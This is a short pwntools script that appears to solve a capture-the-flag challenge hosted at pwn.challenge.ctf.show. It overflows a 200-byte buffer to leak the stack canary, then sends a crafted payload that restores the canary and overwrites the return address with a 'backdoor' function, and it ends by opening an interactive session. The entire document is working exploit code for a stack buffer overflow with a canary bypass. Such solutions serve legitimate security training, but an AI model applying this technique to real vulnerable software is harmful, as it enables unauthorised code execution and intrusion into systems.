from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28128)
elf = ELF('./pwn')
backdoor = elf.sym["backdoor"] 
io.recvuntil("Try Bypass Me!\n")
# leak Canary
payload = "A"*200
io.sendline(payload)
io.recvuntil("A"*200)
Canary = u32(io.recv(4)) - 0xa 
log.info("Canary:"+hex(Canary))
# Bypass Canary
payload = "\x90"*200 + p32(Canary)+"\x90"*12 + p32(backdoor) 
io.send(payload)
io.recv()
io.recv()
io.interactive()
